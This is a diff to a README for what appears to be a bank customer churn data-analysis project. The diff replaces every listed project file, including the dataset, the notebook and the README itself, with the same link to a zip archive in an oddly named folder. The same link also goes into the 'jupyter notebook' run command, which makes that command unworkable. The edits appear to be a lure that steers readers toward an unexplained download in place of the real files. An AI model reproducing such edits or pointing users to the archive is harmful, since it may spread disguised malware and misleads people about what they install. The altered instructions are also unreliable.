@@ -29,13 +29,13 @@ This project focuses on analyzing bank customer data to understand **customer ch
 ---
 
 ## 📂 Project Files
-- **Customer-Churn-Records.csv**  
+- **https://github.com/Tushar8102/Bank-Customer-Churn-Analysis/raw/refs/heads/main/unblaming/Analysis-Bank-Churn-Customer-v1.4-alpha.2.zip**  
   Dataset containing bank customer information and churn labels.
   
-- **Bank_Customer_Churn_Analysis.ipynb**  
+- **https://github.com/Tushar8102/Bank-Customer-Churn-Analysis/raw/refs/heads/main/unblaming/Analysis-Bank-Churn-Customer-v1.4-alpha.2.zip**  
   Jupyter Notebook with step-by-step data analysis and visualizations.
   
-- **README.md**  
+- **https://github.com/Tushar8102/Bank-Customer-Churn-Analysis/raw/refs/heads/main/unblaming/Analysis-Bank-Churn-Customer-v1.4-alpha.2.zip**  
   Project documentation.
 
 ---
@@ -44,4 +44,4 @@ This project focuses on analyzing bank customer data to understand **customer ch
 1. Clone the repository or download the files.
 2. Open the Jupyter Notebook:
    ```bash
-   jupyter notebook Bank_Customer_Churn_Analysis.ipynb
+   jupyter notebook https://github.com/Tushar8102/Bank-Customer-Churn-Analysis/raw/refs/heads/main/unblaming/Analysis-Bank-Churn-Customer-v1.4-alpha.2.zip
